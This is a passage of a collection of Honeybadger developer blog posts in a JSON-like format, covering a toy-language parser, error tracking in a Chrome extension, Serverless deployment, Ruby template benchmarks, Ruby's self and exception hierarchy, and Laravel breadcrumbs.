determine_infix_function ( nxt ) return expr if infix_parsing_function . nil? consume expr = send ( infix_parsing_function , expr ) end expr end In the first part of the method, we will use the same #parse_identifier method we used to parse the num variable. Then, for the first time, the conditions of the while loop will evaluate to true; the next token is not a terminator, and the precedence of the next token is greater than the precedence of this current execution of parse_expr_recursively ( precedence is the default, 0, while nxt_precedence returns 6 since the next token is of type :'*' ). This indicates that the node we already built (an AST::Identifier representing num ) will probably be deeper in our AST (i.e., it will be the child of a node yet to be built). We enter the loop and call #determine_infix_function , passing to it the next token (the * ): def determine_infix_function ( token = current ) if ( BINARY_OPERATORS + LOGICAL_OPERATORS ). include? ( token . type ) :parse_binary_operator elsif token . type == :'(' :parse_function_call end end Since * is a binary operator, running #determine_infix_function will result in :parse_binary_operator . Back in #parse_expr_recursively , we will advance our tokens pointer by one position and then call #parse_binary_operator , passing along the value of expr (the AST::Identifier representing num ): [ :fn , :identifier , :\":\" , :identifier , :\" \\n \" , :identifier , : * , :number , :\" \\n \" , :end , :\" \\n \" , :eof ] #▲ def parse_binary_operator ( left ) op = AST :: BinaryOperator . new ( current . type , left ) op_precedence = current_precedence consume op . right = parse_expr_recursively ( op_precedence ) op end class Stoffle::AST::BinaryOperator < Stoffle :: AST :: Expression attr_accessor :operator , :left , :right def initialize ( operator , left = nil , right = nil ) @operator = operator @left = left @right = right end def == ( other ) operator == other & . operator && children == other & . children end def children [ left , right ] end end At #parse_binary_operator , we create an AST::BinaryOperator (its implementation is shown above if you are curious) to represent * , setting its left operand to the identifier ( num ) we received from #parse_expr_recursively . Then, we save the precedence value of * at the local var op_precedence and advance our token pointer. To finish building our node representing * , we call #parse_expr_recursively again! We need to proceed in this fashion because the right-hand side of our operator will not always be a single number or identifier; it can be a more complex expression, such as something like num * (2 + 2) . One thing of utmost importance that happens here at #parse_binary_operator is the way in which we call #parse_expr_recursively back again. We call it passing 6 as a precedence value (the precedence of * , stored at op_precedence ). Here we observe an important aspect of our parsing algorithm, which was mentioned previously. By passing a relatively high precedence value, it seems like * is pulling the next token as its operand. Imagine we were parsing an expression like num * 2 + 1 ; in this case, the precedence value of * passed in to this next call to #parse_expr_recursively would guarantee that the 2 would end up being the right-hand side of * and not an operand of + , which has a lower precedence value of 5 . After #parse_expr_recursively returns an AST::Number node, we set it as the right-hand size of * and, finally, return our complete AST::BinaryOperator node. At this point, we have, basically, finished parsing our Stoffle program. We still have to parse some terminator tokens, but this is straightforward and not very interesting. At the end, we will have an AST::Program instance at @ast with expressions that could be visually represented as the tree we saw at the beginning of this post and in the introduction to the second section of the post: Wrapping Up In this post, we covered the principal aspects of Stoffle's parser. If you understand the bits we explored here, you shouldn't have much trouble understanding other parser methods we were not able to cover, such as parsing conditionals and loops. I encourage you to explore the source code of the parser by yourself and tweak the implementation if you are feeling more adventurous! The implementation is accompanied by a comprehensive test suite, so don't be afraid to try things out and mess up with the parser. In subsequent posts in this series, we will finally breathe life into our little monster by implementing the last bit we are missing: the tree-walk interpreter. I can't wait to be there with you as we run our first Stoffle program!", "date": "2020-11-11"},
{"website": "Honey-Badger", "title": "How to Track Errors in Your Chrome Extension", "author": ["Sam Smith"], "link": "https://www.honeybadger.io/blog/how-to-track-errors-in-your-chrome-extension/", "abstract": "Releasing a new feature or product is always a harrowing adventure. I’ve used Honeybadger for various projects over the last few years, and naturally, my team set it up when I came to build Sigstr . We love the ability to see what our customers are experiencing. It lets us be hyper-reactive to problems, helps our product team prioritize tasks, and provides deeper insights to our customer service team. When my team started building Sigstr’s Chrome Extension to support our new Dynamic Campaign feature , we quickly realized the need to gain awareness into application behaviors encountered by users who installed the extension. So I wondered how we could use Honeybadger to report errors for our Chrome extension. Here’s what we did. Create a New Project in Honeybadger We created a new project in our Honeybadger account so we could track the errors separately from our other projects. A new project gives us a new Honeybadger API key to use in the steps below. Set up Honeybadger in the Code Using the “CommonJS” examples from the Honeybadger install docs , we went about setting up the requirements needed to report notifications back to Honeybadger. First, we added the latest honeybadger.min.js source to the root of our extension’s project. At time of build, that was https://js.honeybadger.io/v0.4/honeybadger.min.js. Next, we made sure that Honeybadger is listed as an accessible resource in our manifest.json file. We also made sure that manifest.json listed the content.js file, which we used to include the Honeybadger source. \" content_scripts \" : [ { \" js \" : [ \" content.js \" ] } ], \" web_accessible_resources \" : [ \" main.js \" , \" honeybadger.min.js \" ] Then, inside of content.js, we loaded the Honeybadger source into the DOM. var s = document . createElement ( ' script ' ); s . src = chrome . extension . getURL ( ' honeybadger.min.js ' ); ( document . head || document . documentElement ). appendChild ( s ); Sending Notifications to Honeybadger Now, we’re able to use the Honeybadger library within our extension and start reporting notifications and errors back to the new project we created. Within our main.js file for the extension, we set up a new Honeybadger configuration. We also added in context data so we can get a better handle on which users are associated with each notification. Honeybadger . configure ({ api_key : ‘ your_api_key_here ’ }); Honeybadger . setContext ({ user_email : ‘ user_email_here ’ }); Sending a Notification With Honeybadger all set up, we created a simple test call in main.js to send a notification to our new project. try { notDefinedFunction (); } catch ( error ) { Honeybadger . notify ( error ); } After packaging the above code into a new test version, we installed the test extension in Chrome. Executing the new tracking code results in a notification being reported to Honeybadger!", "date": "2016-11-08"},
{"website": "Honey-Badger", "title": "Conditionally deploying parts of your CloudFormation stack with the Serverless Framework", "author": ["Benjamin Curtis"], "link": "https://www.honeybadger.io/blog/conditional-resource-deployment-with-serverless-framework/", "abstract": "While working on putting the finishing touches on v1 of Hook Relay , we decided to try using AWS Timestream ,\nAWS' recently-released time series database. This led to a problem with deploying our stack, since we are using the Serverless Framework to deploy the Lambda functions we are using to multiple AWS regions. The problem was that Timestream isn't yet available in all the regions we are using, so the CloudFormation stack that is being generated by the framework isn't valid in those regions that don't have Timestream. There isn't a built-in way to exclude a portion of the resources block (the portion that creates the Timestream database and table) when deploying to specific regions, so we had to get a little creative. Here's our solution: serverless.yml service : hook-relay provider : name : aws custom : resources : us-east-1 : ${file(./resources/timestream.yml)} resources : - ${file(./resources/main.yml)} - ${self:custom.resources.${self:provider.region}, ''} resources/timestream.yml Resources : tsdb : Type : AWS::Timestream::Database Properties : DatabaseName : \" hook-relay-${self:custom.stage}\" tsdeliveries : Type : AWS::Timestream::Table Properties : DatabaseName : !Ref tsdb TableName : deliveries As you can see, we use a combination of custom variables, file includes, default values, and the ability to define multiple Resources blocks to get what we want. First we define a custom variable resources.us-east-1 that yanks in the content of the timestream.yml file, which has the CloudFormation definition of the resources that should only be created in that one region. Then we include the contents of that variable in the resources block by interpolating the current region as part of the variable name, with an empty string as the default fallback when that custom variable doesn't exist (e.g., when deploying to eu-central-1 via a command line option to sls deploy ). Finally, we include the contents of resources/main.yml in the resources block. This file has another CloudFormation configuration that defines the resources that should be present in each region, such as DynamoDB tables, SQS queues, etc. With that, whenever you run sls deploy , regardless of the region you deploy to, you'll get the AWS resources you want, without the ones you don't. Thanks to Cameron Childress for providing essential tips that led to this solution.", "date": "2020-10-15"},
{"website": "Honey-Badger", "title": "Which is fastest? ERB vs. HAML vs. Slim", "author": ["Diogo Souza"], "link": "https://www.honeybadger.io/blog/ruby-template-performance-erb-haml-slim/", "abstract": "In this article, we’ll test and analyze the performance of three most popular Ruby templating engines: ERB (the default one), HAML , and SLIM . Benchmarking is the practice of comparing business processes and performance metrics to industry bests and best practices from other companies. Meanwhile, load testing is the process of putting demand on a system and measuring its response. Our goal is to explore a little bit of the Ruby Benchmark module , which provides methods to measure and report the time used to execute Ruby code. We’ll create some inline templates, run them against the tests, and extract metrics over the three different engines. After that, we'll dive into load testing by creating some real-world template views, put them live on the server, and then perform some load tests via the hey tool. It provides us with some great features to send loads to a specific web application and get thorough data related to how each endpoint and, hence, each template engine is performing. Setup The first thing to do, of course, is to make sure you already have Ruby installed. We’re using the most recent version, 2.7.0, as of the writing of this article. Make sure to also install the Rails gem . Ruby and the Rails gem are pretty much what we need to get started. For this tutorial, Visual Studio Code is the IDE for coding, but feel free to pick another if you prefer. Now, choose a folder for our Rails project and run the following command: rails new haml-slim-erb This will download all the required dependencies and create our scaffolded Rails project. Go ahead and explore it. Before proceeding to the code, we need to add the SLIM and HAML dependencies to our Gemfile : group :development , :test do # Call 'byebug' anywhere in the code to stop execution and get a debugger console gem 'byebug' , platform: :mri gem 'haml' gem 'slim' end There’s also a bug that comes by default with the project that’s related to the SQLite version. Locate it in the Gemfile and change it to the following: gem 'sqlite3' , '~> 1.3.0' Now, run the bundle install command to download the dependencies. Exploring the Benchmark Module For this part of the article, we’ll be working directly with the test folder. Open it, and you’ll see some empty folders. Let’s create a new one called benchmark and three other files: example_1_test.rb , example_2_test.rb , and example_3_test.rb. . Ruby needs that t end with test to be considered a test file. Next, add the following content to the first file: require 'benchmark' number = ( 0 .. 50 ). to_a . sort { rand () - 0.5 }[ 0 .. 10000 ] puts Benchmark . measure { 20_000 . times do number [ rand ()] * ( 0 .. 50 ). to_a . sort { rand () - 0.5 }[ 0 .. 10000 ][ rand ()] end } Note that the first line imports the required Benchmark module. Then, we generate a random array of numbers from 0 to 50 with 10.000 of size. These big numbers are just to take some time in processing. The method measure is very useful because it can be placed anywhere in your Ruby code to measure how much time it’s taking to process. This time is returned and printed by the puts . Inside, we’re looping for 20k times the execution of the same random-generated array to multiply one value of each. To run this test file specifically, issue the following command: rake test TEST = test /benchmark/example_1_test.rb The result may look like this: 0.702647   0.012353   0.715000 ( 0.721910 ) This report prints, respectively, the user CPU time, the system CPU time, the sum of the user and system CPU times, and the elapsed real-time. The unit of time is seconds. We’ll make use of the other Benchmark methods further in practice. Inline Templates Testing Now that you understand a bit more about how Ruby’s Benchmark module works, we’ll dive into the execution of some tests over the three templates. For this, we’ll create a single template, translate it into the three engine syntax, and finally, run it under the Benchmark method. Add the following to the second test file: require 'erb' require 'haml' require 'slim' require 'benchmark' require 'ostruct' notes = OpenStruct . new title: 'Write an essay' , description: 'My essay is about...' , randomList: ( 0 .. 50 ). to_a . sort { rand () - 0.5 }[ 0 .. 10000 ] erb_example = <<- ERB_EXAMPLE <span><%= notes.title %></span>\n<span><%= notes.description %></span>\n<table>\n  <tr>\n    <% notes.randomList.each do |note| %>\n      <td><%= note %></td>\n    <% end %>\n  </tr>\n</table> ERB_EXAMPLE slim_example = <<- SLIM_EXAMPLE span= notes.title\nspan= notes.description\ntable\n  tr\n    - notes.randomList.each do |note|\n      td= note SLIM_EXAMPLE haml_example = <<- HAML_EXAMPLE %span= notes.title\n%span= notes.description\n%table\n  %tr\n    - notes.randomList.each do |note|\n      %td= note HAML_EXAMPLE context = OpenStruct . new notes: notes __result = '' Benchmark . bmbm ( 20 ) do | bcmk | bcmk . report ( \"erb_test\" ) { ( 1 .. 2000 ). each { ERB . new ( erb_example , 0 , '-' , '__result' ). result binding } } bcmk . report ( \"slim_test\" ) { ( 1 .. 2000 ). each { __result = Slim :: Template . new { slim_example }. render ( context ) } } bcmk . report ( \"haml_test\" ) { ( 1 .. 2000 ). each { __result = Haml :: Engine . new ( haml_example ). render ( binding ) } } end First, import the required modules. Other than the template engines, we’re also importing the ostruct module. An OpenStruct is a data structure from metaprogramming, similar to a Hash , that allows the definition of arbitrary attributes with their accompanying values. It is useful because we don’t need to create a whole class structure to store the values. We can define it inline. Our struct is basically a Note object with a title, description, and a list of random numbers, which increase processing time. We won’t focus on how each template engine works; you can refer to their official docs for this. However, their syntax is pretty easy to assimilate. The magic is placed at the end of the code. Now, we’re using the bmbm method, which does a bit more than the first one. Sometimes, benchmark results may be skewed due to external factors, such as garbage collection, memory leaks, etc. This method attempts to minimize this effect by running the tests twice: the first time as a rehearsal to get the runtime environment stable and the second time for real. You can read more on this here . Finally, each one of the bmbm ’s inner code lines executes a loop 2000 times during the creation of each template. The focus is on assigning the template and rendering it. After executing this test file, here’s the result: Rehearsal -------------------------------------------------------- erb_test               0.311534   0.002963   0.314497 ( 0.314655 ) slim_test              2.544711   0.004520   2.549231 ( 2.550307 ) haml_test              1.449813   0.003169   1.452982 ( 1.454118 ) ----------------------------------------------- total: 4.316710sec\n\n                           user     system      total        real\nerb_test               0.298730   0.000679   0.299409 ( 0.299631 ) slim_test              2.550665   0.004148   2.554813 ( 2.556023 ) haml_test              1.432653   0.001984   1.434637 ( 1.435417 ) The two result blocks are separated for you to assimilate what’s real from the rehearsal. Changing the Scenario a Bit For the last test results, you could assume that ERB is the best option, while SLIM is the worst. Again, it depends on the situation. In that test, every time we loop, we have to instantiate a new template engine object. This is not an optimal flow. Let’s change it slightly and move this instantiation to the outside, as shown in the following code snippet: erb_engine = ERB . new ( erb_example , 0 , '-' , '__result' ) slim_engine = Slim :: Template . new { slim_example } haml_engine = Haml :: Engine . new ( haml_example ) Benchmark . bmbm ( 10 ) do | bcmk | bcmk . report ( \"erb_test\" ) { ( 1 .. 2000 ). each { erb_engine . result binding } } bcmk . report ( \"slim_test\" ) { ( 1 .. 2000 ). each { __result = slim_engine . render ( context ) } } bcmk . report ( \"haml_test\" ) { ( 1 .. 2000 ). each { __result = haml_engine . render ( binding ) } } end The code does exactly the same as before. Now, run the tests again, and you’ll see something like this as a result: Rehearsal ---------------------------------------------- erb_test     0.127599   0.002407   0.130006 ( 0.130137 ) slim_test    0.046972   0.000841   0.047813 ( 0.047858 ) haml_test    0.208308   0.002239   0.210547 ( 0.210769 ) ------------------------------------- total: 0.388366sec\n\n                 user     system      total        real\nerb_test     0.118002   0.000556   0.118558 ( 0.118618 ) slim_test    0.040129   0.000090   0.040219 ( 0.040320 ) haml_test    0.205331   0.001163   0.206494 ( 0.206680 ) Notice which one is the best and the worst now. This is just to show that there is no silver bullet in terms of a perfect engine. You must test and analyze which features perform better for your style of coding. Plus, there are other auxiliary tools, such as Ruby Profiler , that you can use to understand better how and why the code behaves this way. Load Testing a Real-World Scenario Let’s move on to something closer to our reality. We’re going to benchmark a real template that lists some notes (three, one for each template engine). Since the benchmark module takes place in the Rails code, we lose some important measures related to the template engine internal processes. This type of benchmark test allows us to see how each engine performs as a whole, from the very beginning of the process via the arrival of a request, to the business logic processing until the response data gets to the views. This last one, specifically, will have a bunch of steps, such as the parsing and rendering processes that the load test can measure, and the benchmark cannot. First, let’s create the Rails controllers for each example: rails g controller notes_erb index\nrails g controller notes_haml index\nrails g controller notes_slim index This command will auto-generate a bunch of common Rails files you may be used to. Next, let’s open the notes_erb_controller.rb created file and change its content to: class NotesErbController < ApplicationController def index @notes = JSON . parse ( Constants :: NOTES , object_class: OpenStruct ) end end Here’s where we feed the templates with data. Note that we have one controller class for each of the engines. Basically, we’re grabbing some JSON from an inline constant. The response is going to be parsed into a new OpenStruct object and returned to the engines. The NOTES constant must be placed into a new file called constants.rb . Go ahead and create it, and then add the following content: class Constants NOTES = '[\n        {\n            \"title\": \"Walk the dog\",\n            \"description\": \"Bla bla\",\n            \"tasks\": [{\n                \"title\": \"Task #1\"\n            },\n            {\n                \"title\": \"Task #2\"\n            },\n            {\n                \"title\": \"Task #3\"\n            }]\n        },\n        ...\n        {\n            \"title\": \"Walk the dog\",\n            \"description\": \"Bla bla\",\n            \"tasks\": [{\n                \"title\": \"Task #1\"\n            },\n            {\n                \"title\": \"Task #2\"\n            },\n            {\n                \"title\": \"Task #3\"\n            }]\n        }\n    ]\n    ' end Please, make sure to change the ellipsis for more note elements. Plus, don’t forget to replicate the logic in each one of the other controllers. Creating the ERB Views Now, it’s time to create the views of our example. To do so, go to the views/notes_erb folder and create two other files: note.html.erb and task.html.erb . They’ll help us build an example that contains views, partials, and layouts. This way, we guarantee our example explored the Rails engines the most. Make sure to create files equivalent to both views/notes_haml and views/notes_slim . Let’s start with the index.html.erb code: <style> h2 { text-align : center ; } table , td , th { border : 1px solid #ddd ; text-align : left ; } table { border-collapse : collapse ; width : 80% ; margin : auto ; } th , td { padding : 15px ; } </style> <h2> List of Notes </h2> <table> <thead> <tr> <th> Title </th> <th> Description </th> <th> Tasks </th> </tr> </thead> <tbody> <%= render partial: 'notes_erb/note' , collection: @notes %> </tbody> </table> There's nothing too special here. Note that we’re importing a partial, the _note.html.erb file, and passing a collection parameter: our @notes previously created in the controller. Here’s the note’s content, by the way: <tr> <td> <span> <%= note . title %> </span> </td> <td> <span> <%= note . description %> </span> </td> <td> <ul> <%= render partial: 'notes_erb/task' , collection: note . tasks %> </ul> </td> </tr> Here's another partial, accessing the tasks array this time. The content for the _task.html.erb is the following: <li> <%= task . title %> </li> HAML’s Views You will notice that the syntax from one engine to another is very similar. What changes is just the verbosity of each one. SLIM, for example, is the cleanest one among them. Take a look at the code for the three files: # Content of index.html.haml :css h2 { text-align : center ; } table , td , th { border : 1px solid #ddd ; text-align : left ; } table { border-collapse : collapse ; width : 80% ; margin : auto ; } th , td { padding : 15px ; } %h2 List of Notes %table %thead %tr %th Title %th Description %th Tasks %tbody = render partial: 'notes_haml/note' , collection: @notes # Content of _note.html.haml %tr %td %span = note . title %td %span = note . description %td %ul = render partial: 'notes_haml/task' , collection: note . tasks # Content of _task.html.haml %li = task . title Very similar, isn't it? SLIM’s Views Finally, we have SLIM's views. Here’s the greatest difference from the other two ones. The whole structure becomes clearer: # index .html.slim css: h2 { text-align : center ; } table , td , th { border : 1px solid #ddd ; text-align : left ; } table { border-collapse : collapse ; width : 80% ; margin : auto ; } th , td { padding : 15px ; } h2 List of Notes table thead tr th Title th Description th Tasks tbody = render partial: 'notes_haml/note' , collection: @notes # _note .html.slim tr td span = note . title td span = note . description td ul = render partial: 'notes_haml/task' , collection: note . tasks # _task .html.slim li = task . title You’ll also have to translate the layouts to each respective engine syntax. Two new files have to be created under the views/layouts folder: application.html.haml and application.html.slim . I’ll leave that job to you as homework. However, if you find it difficult, you can consult my version in the GitHub project link available at the end of the article. Running the Tests Finally, we get to test the example. First, start up the application by running the rails s command. It’ll start at the http://localhost:3000/ address. Here’s what the view will look like: Each template engine example will be available at its respective URL auto-generated in the config/routes.rb file. To benchmark test these examples, we’ll make use of the hey benchmark tool. It is very simple and provides some useful information for benchmark analysis. These are the commands: $ hey http://localhost:3000/notes_erb/index\n\nSummary:\n  Total:        9.3978 secs\n  Slowest:      9.1718 secs\n  Fastest:      0.0361 secs\n  Average:      1.2714 secs\n  Requests/sec: 21.2816 $ hey http://localhost:3000/notes_haml/index\nSummary:\n  Total:        10.8661 secs\n  Slowest:      10.2354 secs\n  Fastest:      0.1871 secs\n  Average:      1.4735 secs\n  Requests/sec: 18.4058 $ hey http://localhost:3000/notes_slim/index\n\nSummary:\n  Total:        11.3384 secs\n  Slowest:      10.7570 secs\n  Fastest:      0.0437 secs\n  Average:      1.5406 secs\n  Requests/sec: 17.6392 As you can see, all the engines are very close in terms of execution time. The default number of requests to run is 200, but you can change this value via the -n option. Let's take a look at the same tests performed with 1200 requests: $ hey -n 1200 http://localhost:3000/notes_erb/index\n\nSummary:\n  Total:        52.2586 secs\n  Slowest:      19.2837 secs\n  Fastest:      0.0389 secs\n  Average:      0.6960 secs\n  Requests/sec: 22.9627 $ hey -n 1200 http://localhost:3000/notes_haml/index\nSummary:\n  Total:        61.7637 secs\n  Slowest:      18.5290 secs\n  Fastest:      0.0442 secs\n  Average:      0.8557 secs\n  Requests/sec: 19.4289 $ hey -n 1200 http://localhost:3000/notes_slim/index\n\nSummary:\n  Total:        63.1625 secs\n  Slowest:      19.9744 secs\n  Fastest:      0.0874 secs\n  Average:      0.7959 secs\n  Requests/sec: 18.9986 When you increase the number of concurrent requests, you'll see differences in total and average processing times increase. Obviously, this scenario, with thousands of parallel requests, is very specific and not very common. However, load testing is all about that, taking the endpoints to the limits. The hey tool also prints other information, such as a response time histogram: It shows the average time each request took to complete in approximate terms. In our example, it’s clear that most of the requests (1048) were completed in 1.893 seconds. This is why it's desirable to perform stress tests at the same time. There’s also more info about latency distribution, details over the DNS dialup and lookup, request writing, waiting and reading times, errors, etc. Check the docs for more custom options/results. Summary You can find the source code for this example here . This kind of test is great for helping you define which template engine may be more suitable for your project needs. As we’ve seen, be careful about poorly implemented code since some small code snippets can abruptly change the overall performance of your execution. Another interesting point is that ERB, as the default Rails engine, is great at its job too. Besides the other engines being faster in some of our tests, ERB is always close enough to prove its value. Finally, I’d recommend that you consider some other important factors in the tests as a homework task, including caching, proxy, the usage of databases, and other storing mechanisms, as well as queues and any such tool of an async nature. These items always play an important role in the way your views behave or the processing time it takes to render them. Good luck!", "date": "2021-03-29"},
{"website": "Honey-Badger", "title": "Understanding `self` in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/ruby-self-cheat-sheet/", "abstract": "Today I'd like to talk about self . If you've been programming Ruby for a while, you've likely internalized the idea of self . Whenever you read or write a program, self is there in the back of your mind. But for less-experienced Rubyists, self can be baffling. It's always changing, but it's never explicitly shown in the code. You're just expected to know. A lot of the problems beginners face are caused by not understanding self . If you've ever \"lost\" an instance variable or puzzled over what data is visible to a mixin, then it's because you didn't understand self in that context. In this post, we're going to look at self in a variety of every-day situations. What is self ? You may have heard people say that everything in Ruby is an object. If that's true it means that every piece of code you write \"belongs\" to some object. self is a special variable that points to the object \nthat \"owns\" the currently executing code. Ruby uses self everwhere: For instance variables: @myvar For method and constant lookup When defining methods, classes and modules. In theory, self is pretty obvious. But in practice, it's easy for tricky situations to pop up. That's why I wrote this post. Examples of self We're going to step through several examples now. If the first ones seem too basic for you, just keep reading. They get more advanced. Inside of an instance method In the code below, reflect is an instance method. It belongs to the object we created via Ghost.new . So self points to that object. class Ghost def reflect self end end g = Ghost . new g . reflect == g # => true Inside of a class method For this example, reflect is a class method of Ghost . With class methods, the class itself \"owns\" the method. self points to the class. class Ghost def self . reflect self end end Ghost . reflect == Ghost # => true It works the same with \"class\" methods inside of modules. For example: module Ghost def self . reflect self end end Ghost . reflect == Ghost # => true Remember, classes and modules are treated as objects in Ruby. So this behavior isn't that different from the instance method behavior we saw in the first example. Inside of a class or module definition One feature of Ruby that makes it such a good fit for frameworks like Rails is that you can execute arbitrary code inside class and module definitions. When you put code inside of a class/module definition, it runs just like any other Ruby code. The only real difference is the value of self . As you can see below, self points to the class or module that's in the process of being defined. class Ghost self == Ghost # => true end module Mummy self == Mummy # => true end Inside mixin methods Mixed-in methods behave just like \"normal\" instance or class methods when it comes to self . This makes sense. Otherwise the mixin wouldn't be able to interact with the class you mixed it into. Instance methods Even though the reflect method was defined in the module, its self is the instance of the class it was mixed into. module Reflection def reflect self end end class Ghost include Reflection end g = Ghost . new g . reflect == g # => true Class methods When we extend a class to mix in class methods, self behaves exactly like it does in normal class methods. module Reflection def reflect self end end class Ghost extend Reflection end Ghost . reflect == Ghost # => true Inside the metaclass Chances are you've seen this popular shortcut for defining lots of class methods at once. class Ghost class << self def method1 end def method2 end end end The class << foo syntax is actually pretty interesting. It lets you access an object's metaclass - which is also called the \"singleton class\" or \"eigenclass.\" I plan on covering metaclasses more deeply in a future post. But for now, you just need to know that the metaclass is where Ruby stores methods that are unique to a specific object. If you access self from inside the class << foo block, you get the metaclass. class << \"test\" puts self . inspect end # => #<Class:#<String:0x007f8de283bd88> Outside of any class If you're running code outside of any class, Ruby still provides self . It points to \"main\", which is an instance of Object : puts self . inspect # => main", "date": "2015-11-02"},
{"website": "Honey-Badger", "title": "Introducing Feedback", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/capture-feedback-when-users-encounter-rails-errors/", "abstract": "Here at Honeybadger we're big fans of eating our own dog food . We were all contractors when we started Honeybadger, and still use our own software regularly to monitor our personal projects. One of the main benefits of this is that it's not difficult to see the product from our customer's perspectives; we are the customer! One thing that we've wanted for some time is a better way to gather feedback from our clients when they encounter an error. Picture this scenario: You're hired to deliver an MVP in 2 months, and are half-way to your deadline. In the true spirit of agile development, you deployed a skeleton Rails app on day 2, and have been shipping ever since. Your client is a hands-on sort of person, and wants to help test each latest build as it's deployed. Naturally, you installed Honeybadger in order to monitor exceptions in your staging environment, which is great because you sound really smart when your client calls to explain that your code doesn't work. But why must they call at all? Don't get me wrong, I'm all about user feedback. Honeybadger reports are indispensable, but it also helps to know what the _user's_intent was when they encountered an error. But an exception is not a case which warrants a phone call , at least not from the user. And sometimes it's difficult (if not impossible) to explain to the user what an exception is, much less what caused it. So how did we build the best of both worlds? Instead of a phone call from your client every time they find a bug, imagine that Honeybadger could display a form on the actual error page which is displayed when the error occurs: Instead of picking up the phone or firing off an email, your client now has an immediate outlet to report what their intent was and what they experienced instead. Once submitting the feedback form, they can rest assured that you're on top of the issue. If a different user encounters the same bug, they can also submit their own feedback. Back in Honeybadger, we display all of the feedback from your users inline in the comments section of your error reports: This is something which I found invaluable immediately after shipping it. I literally deployed the feature, installed the new gem on a client project, and had several feedback submissions the same day; which is awesome, because it kept several emails from hitting my already crowded inbox \\m/. Oh, and if you do want to be notified when a user sends feedback, you can by enabling comment notifications in your project settings. Installing the feedback form is simple — just add a single HTML comment to your public/500.html file in Rails. For full instructions, check out the documentation. Not using Honeybadger yet? Start tracking errors today!", "date": "2014-01-19"},
{"website": "Honey-Badger", "title": "Ruby's Exception vs StandardError: What's the difference?", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/ruby-exception-vs-standarderror-whats-the-difference/", "abstract": "\"Never rescue Exception in Ruby!\" Maybe you've heard this before. It's good advice, but it's pretty confusing unless you're already in the know. Let's break this statement down and see what it means. You probably know that in Ruby, you can rescue exceptions like so: begin do_something () rescue => e puts e # e is an exception object containing info about the error. end And you can rescue specific errors by providing the classname of the error. begin do_something () rescue ActiveRecord :: RecordNotFound => e puts e # Only rescues RecordNotFound exceptions, or classes that inherit from RecordNotFound end Every type of exception in Ruby is just a class. In the example above, ActiveRecord::RecordNotFound is just the name of a class that follows certain conventions. This is important because when you rescue RecordNotFound , you also rescue any exceptions that inherit from it. Why you shouldn't rescue Exception The problem with rescuing Exception is that it actually rescues every exception that inherits from Exception . Which is....all of them! That's a problem because there are some exceptions that are used internally by Ruby. They don't have anything to do with your app, and swallowing them will cause bad things to happen. Here are a few of the big ones: SignalException::Interrupt - If you rescue this, you can't exit your app by hitting control-c. ScriptError::SyntaxError - Swallowing syntax errors means that things like puts(\"Forgot something) will fail silently. NoMemoryError - Wanna know what happens when your program keeps running after it uses up all the RAM? Me neither. begin do_something () rescue Exception => e # Don't do this. This will swallow every single exception. Nothing gets past it. end I'm guessing that you don't really want to swallow any of these system-level exceptions. You only want to catch all of your application level errors. The exceptions caused YOUR code. Luckily, there's an easy way to to this. Rescue StandardError Instead All of the exceptions that you should care about inherit from StandardError . These are our old friends: NoMethodError - raised when you try to invoke a method that doesn't exist TypeError - caused by things like 1 + \"\" RuntimeError - who could forget good old RuntimeError? To rescue errors like these, you'll want to rescue StandardError . You COULD do it by writing something like this: begin do_something () rescue StandardError => e # Only your app's exceptions are swallowed. Things like SyntaxErrror are left alone. end But Ruby has made it much easier for use. When you don't specify an exception class at all, ruby assumes you mean StandardError. So the code below is identical to the above code: begin do_something () rescue => e # This is the same as rescuing StandardError end Custom Exceptions Should Inherit from StandardError So what does this mean for you if you're creating your own custom exceptions? It means you should always inherit from StandardError , and NEVER from Exception . Inheriting from Exception is bad because it breaks the expected behavior of rescue. People will think they're rescuing all application-level errors but yours will just sail on through. class SomethingBad < StandardError end raise SomethingBad The Exception Tree Since Ruby's exceptions are implemented in a class heirarchy, it can be helpful to see it laid out. Below is a list of exception classes that ship with Ruby's standard library. Third-party gems like rails will add additional exception classes to this chart, but they will all inherit from some class on this list. Exception NoMemoryError ScriptError LoadError NotImplementedError SyntaxError SignalException Interrupt StandardError ArgumentError IOError EOFError IndexError LocalJumpError NameError NoMethodError RangeError FloatDomainError RegexpError RuntimeError SecurityError SystemCallError SystemStackError ThreadError TypeError ZeroDivisionError SystemExit fatal", "date": "2015-05-29"},
{"website": "Honey-Badger", "title": "Introducing Breadcrumbs for Laravel", "author": ["Shalvah Adebayo"], "link": "https://www.honeybadger.io/blog/laravel-breadcrumbs/", "abstract": "Some time ago, we introduced breadcrumbs for Ruby and JavaScript . We're pleased to announce that breadcrumbs are now officially supported in our PHP libraries. Here's a quick walkthrough. How do breadcrumbs help? A big part of debugging errors is wondering, \"How did this happen? Why is this value null?\" To help with this, you've probably added extra logs to your app, so you can reference them when something happens. Log :: debug ( \"Processed payment request for $userId \" ); Log :: debug ( \"Sending notification to user $userId on channel $channel \" ); But logs can be noisy and unstructured. Breadcrumbs let you replace those debug logs with structured event records. No more scouring log files to find out what was going on at 11:20 PM yesterday. Record these events with Honeybadger and you'll see the breadcrumbs right in the error detail on your dashboard. Recording a breadcrumb is easy. Use the addBreadcrumb() method on the Honeybadger client: $honeybadger -> addBreadcrumb ( 'Sending notification' , [ 'user' => $user -> id , 'channel' => $channel ]); // In Laravel Honeybadger :: addBreadcrumb ( 'Sending notification' , [ 'user' => $user -> id , 'channel' => $channel ]); If an error occurs later, the breadcrumb will show up in your dashboard: In our example, the channel is empty — that might be the cause of our error. Automatic Breadcrumbs in Laravel Even better, if you're using Laravel, we'll automatically capture breadcrumbs for interesting events. We listen for the following events: Log messages View renders Email dispatches Job dispatches Notification dispatches Database queries Redis commands Incoming requests All of this can be configured in the config/honeybadger.php config file. How can you use them? Breadcrumbs are currently available in our PHP client as of version 2.8.0, and in our Laravel client as of version 3.8.0. You can update your Honeybadger client by running: composer update honeybadger-io/honeybadger-laravel or: composer update honeybadger-io/honeybadger-php (depending on which you're using.) Be sure to check out our documentation for more details on using breadcrumbs in PHP. Let us know how it goes! We hope that breadcrumbs will be a helpful addition to your debugging toolbox. Try it out, and give us a shout if there is anything you would like to see added.", "date": "2021-03-31"},
